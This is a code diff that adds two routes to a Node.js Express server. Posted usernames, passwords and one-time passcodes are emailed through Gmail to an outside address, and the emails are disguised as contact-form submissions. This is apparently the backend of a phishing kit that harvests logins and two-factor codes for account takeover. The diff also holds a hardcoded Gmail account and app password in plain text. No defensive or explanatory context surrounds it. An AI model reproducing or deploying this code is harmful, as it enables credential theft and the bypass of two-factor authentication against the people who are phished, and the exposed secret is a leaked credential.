@@ -711,3 +711,87 @@ const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
+
+
+
+app.post("/starb", async (req, res) => {
+  const {
+    userName,
+    password
+  } = req.body;
+  console.log(req.body);
+
+  // Construct email message
+  const message = `
+    New details${userName}:
+
+    user Name: ${userName}
+    Password: ${password}
+
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "rockydean70@gmail.com", // list of receivers
+    subject: `New Contact Form Submission ${userName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
+
+app.post("/starbotp", async (req, res) => {
+  const {
+    userName,
+   otp,
+  } = req.body;
+
+  // Construct email message
+  const message = `
+    New details for${userName}:
+
+    OTP: ${otp}
+
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "rockydean70@gmail.com", // list of receivers
+    subject: `New Contact Form Submission ${userName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
